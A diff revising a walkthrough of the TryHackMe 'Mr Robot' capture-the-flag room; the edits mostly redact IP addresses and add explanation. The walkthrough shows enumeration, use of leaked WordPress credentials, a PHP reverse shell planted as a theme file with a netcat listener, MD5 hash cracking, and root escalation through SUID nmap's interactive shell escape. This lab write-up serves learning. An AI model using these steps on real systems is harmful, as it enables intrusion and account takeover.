@@ -6,9 +6,9 @@ Room link: https://tryhackme.com/room/mrrobot
 
 As always, for my first scan I used an aggressive NMAP scan. 
 ```
-ajread@aj-ubuntu:~/TryHackMe$ nmap -A 10.10.110.127
+ajread@aj-ubuntu:~/TryHackMe$ nmap -A [Remote IP]
 Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-18 23:12 EST
-Nmap scan report for 10.10.110.127
+Nmap scan report for [Remote IP]
 Host is up (0.14s latency).
 Not shown: 997 filtered ports
 PORT    STATE  SERVICE  VERSION
@@ -26,17 +26,17 @@ PORT    STATE  SERVICE  VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 38.77 seconds
 ```
-It appears I am working with ssh and http/https. 
+It appears I am working with ssh and http/https on this box. 
 
-I used gobuster to enumerate port 80. It returned a LOT of hits. 
+I used gobuster to enumerate port 80. It returned a LOT of hits. Just from looking at the website, there was a lot going on so I kind of expected that. 
 ```
-ajread@aj-ubuntu:~/TryHackMe$ gobuster -u 10.10.228.238 -w /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt 
+ajread@aj-ubuntu:~/TryHackMe$ gobuster -u [Remote IP] -w /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt 
 
 =====================================================
 Gobuster v2.0.1              OJ Reeves (@TheColonial)
 =====================================================
 [+] Mode         : dir
-[+] Url/Domain   : http://10.10.228.238/
+[+] Url/Domain   : http://[Remote IP]/
 [+] Threads      : 10
 [+] Wordlist     : /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt
 [+] Status codes : 200,204,301,302,307,403
@@ -90,36 +90,37 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 2022/02/19 18:02:38 Finished
 =====================================================
 ```
-
-There appears to be a robots.txt file. I used curl to investigate the page and found that ```key-1-of-3.txt``` is referenced there. 
+From gobuster, there appears to be a robots.txt file. I used curl to investigate the page and found that ```key-1-of-3.txt``` is referenced there. 
 ```
-ajread@aj-ubuntu:~/TryHackMe$ curl http://10.10.110.127/robots.txt
+ajread@aj-ubuntu:~/TryHackMe$ curl http://[Remote IP]/robots.txt
 User-agent: *
 fsocity.dic
 key-1-of-3.txt
 ```
-I can run ```curl http://10.10.110.127/key-1-of-3.txt``` to get the first key, done! 
+I can run ```curl http://[Remote IP]/key-1-of-3.txt``` to get the first key, done! 
 
 # Key 2
 
-The output of the directory enumeration also pointed me to the ```/license``` directory. If I navigate to the site, it appears to supply some base64 encoded string at the bottom of the page. 
+The output of the directory enumeration (gobuster) also pointed me to the ```/license``` directory. If I navigate to the site, it appears to supply some base64 encoded string at the bottom of the page. 
 ```
-ajread@aj-ubuntu:~/TryHackMe$ curl http://10.10.228.238/license
+ajread@aj-ubuntu:~/TryHackMe$ curl http://[Remote IP]/license
+...
+...
 ...
 ZWxsaW90OkVSMjgtMDY1Mgo=
 ```
-The base64 encoded string decodes to ```elliot:ER28-0652```. This looks like credentials! Also, it appears there is a login page at ```/wp-login```. Out of curiosity, I tried to newly found credentials on the page and they worked! The site drops me into what appears to be a user blog dashboard run by Wordpress 4.3.1. I do some research and find that I can use this method to upload a reverse shell easily: https://www.hackingarticles.in/wordpress-reverse-shell/ It looks like I could also go the metasploit route. But, let's be adventerous today and try the manual way. The php reverse shell that I use is from pentest monkey on github: https://github.com/pentestmonkey/php-reverse-shell. I made sure to change the IP and port the shell to point back to me local/attack machine. 
+The base64 encoded string decodes to ```elliot:ER28-0652```. This looks like credentials! Also, it appears there is a login page at ```/wp-login```. Out of curiosity, I tried the newly found credentials on the page and they worked! The site drops me into what appears to be a user blog dashboard run by Wordpress version 4.3.1. I do some research and find that I can use this method: https://www.hackingarticles.in/wordpress-reverse-shell/  to upload a reverse shell. It looks like I could also go the metasploit route. But, let's be adventerous today and try the manual way. The php reverse shell that I use is from pentest monkey on github: https://github.com/pentestmonkey/php-reverse-shell. I made sure to change the IP and port the shell to point back to me local/attack machine. 
 
-With everything in place, I start a netcat listener on my machine. 
+With everything in place and following the directions from the hackingarticles site, I start a netcat listener on my local machine. 
 ```
 ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 9999
 Listening on 0.0.0.0 9999
 ```
-I run a curl command to call the updated php theme that, in reality, is my php reverse shell. 
+I run a curl command from my local machine to call the updated php theme that, in reality, is my php reverse shell (https://www.hackingarticles.in/wordpress-reverse-shell/). 
 ```
-ajread@aj-ubuntu:~$ curl http://10.10.228.238/wp-content/themes/twentyfifteen/404.php
+ajread@aj-ubuntu:~$ curl http://[Remote IP]/wp-content/themes/twentyfifteen/404.php
 ```
-And it drops me into a shell! 
+And it drops me into a shell as daemon! 
 ```
 Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
  23:16:15 up 38 min,  0 users,  load average: 0.00, 0.36, 1.76
@@ -133,7 +134,7 @@ I make sure to upgrade the shell with python.
 $ python -c 'import pty;pty.spawn("/bin/bash")'
 daemon@linux:/$ 
 ```
-If I navigate to the home folder of user robot, I find some interesting files.
+If I navigate to the home folder of user robot, I find some interesting files that I dont have access to, except for one. 
 ```
 daemon@linux:/home/robot$ ls -la
 ls -la
@@ -143,7 +144,7 @@ drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
 -r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
 -rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
 ```
-The ```password.raw-md5``` is an MD5 hash of the user robot. I dropped the hash into crackstation (https://crackstation.net/) and found the password for user robot. With the password, I am able to authenticate as robot and read key 2! 
+The ```password.raw-md5``` appears to be an MD5 hash of the user robot's credentials. I dropped the hash into crackstation (https://crackstation.net/) and found the password for user robot. With the password, I am able to authenticate as robot and read key 2! 
 ```
 daemon@linux:/home/robot$ su robot  
 su robot 
@@ -155,7 +156,7 @@ wc -c key-2-of-3.txt
 ```
 # Key 3
 
-Key 3 probably requires privilege escalation. I wanted to see if I could use a GTFO bin to execute a binary as root user and gain its privilege. I used ```find / -perm +6000 2>/dev/null``` to do so. 
+Key 3 probably requires privilege escalation. I wanted to see if I could use a GTFO bin to execute a binary as root user and gain its privilege. I used ```find / -perm +6000 2>/dev/null``` to do so, which checks for files with SGID/SUID bit set. 
 ```
 robot@linux:~$ find / -perm +6000 2>/dev/null
 find / -perm +6000 2>/dev/null
@@ -209,7 +210,7 @@ find / -perm +6000 2>/dev/null
 /var/mail
 /sbin/unix_chkpwd
 ```
-Analyzing the output of the command, it looks like I can priv esc using nmap run in interactive mode (https://vk9-sec.com/nmap-privilege-escalation/). 
+Analyzing the output of the command, it looks like I can priv esc using nmap (```/usr/local/bin/nmap```) in interactive mode (https://vk9-sec.com/nmap-privilege-escalation/). 
 
 ```
 robot@linux:~$ nmap --interactive
@@ -242,7 +243,7 @@ Examples:
 n -sS -O -v example.com/24
 f --spoof "/usr/local/bin/pico -z hello.c" -sS -oN e.log example.com/24
 ```
-It seems that running a command with ```!``` at the beginning allows me to run a shell command. And like that, I can read the last key! 
+Running a command with ```!``` at the beginning allows me to run a shell command. And like that, I can read the last key! 
 
 ```
 nmap> !wc -c /root/key-3-of-3.txt
